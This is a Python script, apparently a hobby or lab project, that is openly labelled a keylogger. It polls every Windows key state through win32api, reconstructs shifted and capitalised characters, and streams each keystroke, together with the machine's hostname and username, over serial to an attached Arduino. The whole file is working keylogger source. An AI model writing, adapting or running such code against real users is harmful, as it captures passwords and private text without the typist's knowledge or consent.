import serial
import serial.tools.list_ports
import time
import socket
import getpass
import win32api

def detectar_arduino():
    puertos = serial.tools.list_ports.comports()
    for p in puertos:
        if ("Arduino" in p.description 
            or "CH340" in p.description 
            or "USB-SERIAL" in p.description):
            return p.device
    return None

PUERTO = detectar_arduino()
if PUERTO is None:
    print("No se encontró Arduino")
    exit(1)

arduino = serial.Serial(PUERTO, 9600, timeout=0)
time.sleep(2)

hostname = socket.gethostname()
usuario = getpass.getuser()
header = f"{hostname}|{usuario}\n"
arduino.write(header.encode())

teclas_especiales = {
    0x08: "<BBK>",
    0x0D: "<EEN>",
    0x25: "<LLEFT>",
    0x26: "<UUP>",
    0x27: "<RRIGHT>",
    0x28: "<DDOWN>",
}

teclas_ascii = {
    0x30: "0", 0x31: "1", 0x32: "2", 0x33: "3",
    0x34: "4", 0x35: "5", 0x36: "6", 0x37: "7",
    0x38: "8", 0x39: "9",
    **{code: chr(code) for code in range(0x41, 0x5A+1)},
    0x20: " ",
}

def shift_activo():
    return (win32api.GetKeyState(0x10) < 0)

def caps_activo():
    return (win32api.GetKeyState(0x14) & 1) != 0

shift_symbols = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
}

estado_anterior = {}

def tecla_presionada(vk):
    return win32api.GetAsyncKeyState(vk) & 0x8000

def salir_solicitado():
    ctrl = tecla_presionada(0x11)
    shift = tecla_presionada(0x10)
    g_key = tecla_presionada(0x47)
    return ctrl and shift and g_key

print("Keylogger ejecutándose. CTRL + SHIFT + G para salir.")

while True:
    if salir_solicitado():
        print("\nSalida solicitada.")
        break

    for vk in range(0x01, 0xFF):
        presionada = tecla_presionada(vk)
        antes = estado_anterior.get(vk, False)

        if presionada and not antes:
            if vk in teclas_especiales:
                arduino.write(teclas_especiales[vk].encode())

            elif vk in teclas_ascii:
                c = teclas_ascii[vk]

                if "A" <= c <= "Z":
                    if shift_activo() ^ caps_activo():
                        arduino.write(c.encode())
                    else:
                        arduino.write(c.lower().encode())

                elif c in "0123456789":
                    if shift_activo() and c in shift_symbols:
                        arduino.write(shift_symbols[c].encode())
                    else:
                        arduino.write(c.encode())

                else:
                    arduino.write(c.encode())

        estado_anterior[vk] = presionada

    time.sleep(0.004)

arduino.close()
